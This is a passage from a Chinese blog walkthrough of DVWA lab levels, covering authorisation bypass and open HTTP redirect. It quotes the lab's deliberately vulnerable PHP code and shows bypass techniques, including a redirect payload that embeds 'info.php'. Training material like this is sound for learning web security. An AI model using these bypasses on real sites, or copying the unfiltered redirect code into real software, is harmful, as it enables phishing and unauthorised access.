<span class="hljs-comment"></span>
<span class="hljs-comment">Have a look at these two files for possible vulnerabilities: </span>
<span class="hljs-comment"></span>
<span class="hljs-comment">* vulnerabilities/authbypass/get_user_data.php</span>
<span class="hljs-comment">* vulnerabilities/authbypass/change_user_details.php</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">*/</span>
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() != <span class="hljs-string">&quot;admin&quot;</span>) &#123;
    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Unauthorised&quot;</span>;
    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">403</span>);
    <span class="hljs-keyword">exit</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里他会判断该用户是否为admin，如果不是则返回403。</p>
<p>但值得注意的是，这段代码似乎只是检查medium.php页面。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190732432.png" alt="image-20240113190732432"></p>
<p>我们继续bp抓一下看看该页面的功能点，可以看到当我们点击update按钮的时候，我们实际上是被get_user_data.php页面进行处理，接下来我们可以猜测该页面没有做未授权处理，我们可以尝试直接访问该页面看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190819631.png" alt="image-20240113190819631"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190942972.png" alt="image-20240113190942972"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190925561.png" alt="image-20240113190925561"></p>
<p>可以看到虽然其只对medium.php做了限制，当我们访问getuserdata的时候，仍然可以得到一些数据</p>
<h2 id="High-15">High</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/*</span>
<span class="hljs-comment">Only the admin user is allowed to access this page.</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">Have a look at this file for possible vulnerabilities: </span>
<span class="hljs-comment"></span>
<span class="hljs-comment">* vulnerabilities/authbypass/change_user_details.php</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">*/</span>

<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() != <span class="hljs-string">&quot;admin&quot;</span>) &#123;
    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Unauthorised&quot;</span>;
    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">403</span>);
    <span class="hljs-keyword">exit</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>依旧是相同的代码，我们接着上一个级别的思路访问一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113192045447.png" alt="image-20240113192045447"></p>
<p>发现行不通了，这个api接口也被禁用了，接下来我们在管理员界面的更新数据地方，进行bp抓包，如下图发现，这里的api接口改为了change功能，而我们可以注意到上一个级别是get功能，这不禁让我们猜测，该功能可能并没有做出有效的未授权访问限制</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193309714.png" alt="image-20240113193309714"></p>
<p>跟踪相关代码也可以发现，这里只对impossible级别做出的严格限制</p>
<p>接下来我们用其他用户访问该api页面，同时bp抓包admin用户的change功能对应的数据包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193638811.png" alt="image-20240113193638811"></p>
<p>接下来尝试将上面的json数据赋值到下面的普通用户数据包中，点击发送可以看到右侧回显访问成功的标志</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193607250.png" alt="image-20240113193607250"></p>
<h2 id="Impossible-15">Impossible</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/*</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">Only the admin user is allowed to access this page</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">*/</span>

<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() != <span class="hljs-string">&quot;admin&quot;</span>) &#123;
    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Unauthorised&quot;</span>;
    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">403</span>);
    <span class="hljs-keyword">exit</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里的代码依旧没有什么变化，但我们跟踪相关文件可以发现：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113192943263.png" alt="image-20240113192943263"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113192956066.png" alt="image-20240113192956066"></p>
<p>这两个api功能文件在对impossible级别上都做出了严格的限制，只要当前用户不是admin，则无权访问，这是无法绕过的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193922658.png" alt="image-20240113193922658"></p>
<p>这里经过测试发现，直接显示无权访问</p>
<h1>0x16 HTTP 重定向</h1>
<h2 id="Low-16">Low</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;
    <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);
    <span class="hljs-keyword">exit</span>;
&#125;
<span class="hljs-title function_ invoke__">http_response_code</span> (<span class="hljs-number">500</span>);
<span class="hljs-meta">?&gt;</span>
&lt;p&gt;Missing redirect target.&lt;/p&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">exit</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里判断redirect参数是否通过get传参，是否存在，如果存在，则直接重定向到url，随后结束脚本执行，否则页面返回500响应。</p>
<p>这里并没有任何过滤，我们可以重定向到任何页面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113172651501.png" alt="image-20240113172651501"></p>
<h2 id="Medium-16">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span> (<span class="hljs-string">&quot;/http:\/\/|https:\/\//i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;
        <span class="hljs-title function_ invoke__">http_response_code</span> (<span class="hljs-number">500</span>);
        <span class="hljs-meta">?&gt;</span>
        &lt;p&gt;Absolute URLs not allowed.&lt;/p&gt;
        <span class="hljs-meta">&lt;?php</span>
        <span class="hljs-keyword">exit</span>;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);
        <span class="hljs-keyword">exit</span>;
    &#125;
&#125;
<span class="hljs-title function_ invoke__">http_response_code</span> (<span class="hljs-number">500</span>);
<span class="hljs-meta">?&gt;</span>
&lt;p&gt;Missing redirect target.&lt;/p&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">exit</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里限制了redirect参数以<a target="_blank" rel="noopener" href="http://xn--https-wm6jl44o">http://或者https</a>://开头，也就是不能以绝对的url开头，但是我们可以使用相对的url</p>
<p>这里借用阮一峰老师对相对url与绝对url的解释：</p>
<pre><code class="hljs scss">URL 分成两种：绝对 URL 和相对 URL。

    绝对 URL 指的是，只靠 URL 本身就能确定资源的位置。这意味着，URL 必须带有资源的完整信息，包含协议、主机、路径等部分。前面的例子都是绝对 URL。

    相对 URL 指的是，URL 不包含资源位置的全部信息，必须结合当前网页的位置，才能定位资源。比如，当前网页的 URL 是https://www.example.com/path/index.html，该网页上面有一个资源，URL 指向a.html，这个就是相对 URL。因为只知道a.html，并不能定位资源。浏览器假定，a.html与当前网址在同一个子目录下面，从而得到绝对 URL https://www.example.com/path/a.html。

相对 URL 如果以斜杠（/）开头，就表示网站的根目录。否则，必须以当前目录为起点，推算资源的位置。比如，相对 URL /foo/bar.html表示网站根目录的子目录foo，foo/bar.html表示在当前目录的foo子目录。

URL 还可以使用两个特殊简写，表示特定位置。

.：表示当前目录，比如./a.html（当前目录下的a.html文件）
..：表示上级目录，比如../a.html（上级目录下的a.html文件）
这两种简写可以多个连用，比如../../表示上两级目录。

绝对 URL 也可以使用这两个简写，比如www.example.com/./index.html等同于www.example.com/index.html，这时.相当于根目录的当前目录，即根目录本身。</code></pre>
<p>因此这一关我们可以这样构造</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113174804930.png" alt="image-20240113174804930"></p>
<h2 id="High-16">High</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>], <span class="hljs-string">&quot;info.php&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;
        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);
        <span class="hljs-keyword">exit</span>;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-title function_ invoke__">http_response_code</span> (<span class="hljs-number">500</span>);
        <span class="hljs-meta">?&gt;</span>
        &lt;p&gt;You can only redirect to the info page.&lt;/p&gt;
        <span class="hljs-meta">&lt;?php</span>
        <span class="hljs-keyword">exit</span>;
    &#125;
&#125;
<span class="hljs-title function_ invoke__">http_response_code</span> (<span class="hljs-number">500</span>);
<span class="hljs-meta">?&gt;</span>
&lt;p&gt;Missing redirect target.&lt;/p&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">exit</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里检查redirect中是否含有info.php字符串，如果含有才会正常的去请求重定向，否则返回500。</p>
<p>由代码审计得，在构造参数时是指包含字符串info.php即可</p>
<pre><code class="hljs plaintext">Payload：?redirect=https//www.baidu.com/?已定义参数=info.php</code></pre>
<p>注意：需要参考网页支持的参数来传递info.php。例如 当该网页没有设定a参数的get传参时：</p>
<p><code>GET ?redirect=https//www.baidu.com/?a=info.php</code> 是无效的，因为字符串&quot;info.php&quot;并未传递给合法的参数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113175207282.png" alt="image-20240113175207282"></p>
<h2 id="Impossible-16">Impossible</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;
    <span class="hljs-keyword">switch</span> (<span class="hljs-title function_ invoke__">intval</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;
        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;info.php?id=1&quot;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;info.php?id=2&quot;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">99</span>:
            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;https://digi.ninja&quot;</span>;
            <span class="hljs-keyword">break</span>;
    &#125;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$target</span> != <span class="hljs-string">&quot;&quot;</span>) &#123;
        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$target</span>);
        <span class="hljs-keyword">exit</span>;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-meta">?&gt;</span>
        Unknown redirect target.
        <span class="hljs-meta">&lt;?php</span>
        <span class="hljs-keyword">exit</span>;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span>
Missing redirect target.</code></pre>
<p>这里采用了表名单过滤，并且将redirect参数内容转换为了整数，这意味着redirect对我们来说已经不可控了</p>
<h1>0x18 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_77485708/article/details/131222466">[网络安全] DVWA之Open HTTP Redirect 攻击姿势及解题详析合集</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/html-tutorial/spilt.4.docs-url.md">绝对 URL 和相对 URL</a></p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/dvwa.html#%E9%83%A8%E7%BD%B2%E5%AE%89%E8%A3%85">DVWA 入门靶场学习记录</a></p>
</script></p></article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/01/10/shen-ru-dvwa/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/01/10/shen-ru-dvwa/')">重温DVWA</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/01/10/shen-ru-dvwa/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=重温DVWA&amp;url=http://hybcx.xyz/2024/01/10/shen-ru-dvwa/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/web%E6%B8%97%E9%80%8F/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>web渗透<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/31/shen-tou-ce-shi-wai-wang-da-dian/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">渗透测试流程&amp;外网打点</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/24/ctf-shua-ti-zhi-lu/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CISCN国赛</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/12/14/pentesterlab-xi-lie/" title="PentesterLab刷题记录"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-12-14</div><div class="title">PentesterLab刷题记录</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-brute-force"><span class="toc-number">1.</span> <span class="toc-text">0x01 Brute Force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">1.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">1.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high"><span class="toc-number">1.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible"><span class="toc-number">1.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-command-injection"><span class="toc-number">2.</span> <span class="toc-text">0x02 Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">2.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">2.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high"><span class="toc-number">2.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible"><span class="toc-number">2.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-csrf"><span class="toc-number">3.</span> <span class="toc-text">0x03 CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">3.1.</span> <span class="toc-text">Low</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88xss"><span class="toc-number">3.1.1.</span> <span class="toc-text">配合XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">3.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high"><span class="toc-number">3.3.</span> <span class="toc-text">High</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js%E5%8F%91%E8%B5%B7http-csrf%E8%AF%B7%E6%B1%82"><span class="toc-number">3.3.1.</span> <span class="toc-text">JS发起HTTP CSRF请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84-html-%E5%8F%91%E8%B5%B7-csrf-%E8%AF%B7%E6%B1%82"><span class="toc-number">3.3.2.</span> <span class="toc-text">常规 HTML 发起 CSRF 请求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible"><span class="toc-number">3.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-file-inclusion"><span class="toc-number">4.</span> <span class="toc-text">0x04 File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">4.1.</span> <span class="toc-text">Low</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">4.1.1.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.1.2.</span> <span class="toc-text">远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-getshell"><span class="toc-number">4.1.3.</span> <span class="toc-text">本地文件包含 Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-getshell"><span class="toc-number">4.1.4.</span> <span class="toc-text">远程文件包含 Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96"><span class="toc-number">4.1.5.</span> <span class="toc-text">伪协议读取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">4.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high"><span class="toc-number">4.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible"><span class="toc-number">4.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-file-upload"><span class="toc-number">5.</span> <span class="toc-text">0x05 File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">5.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">5.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item 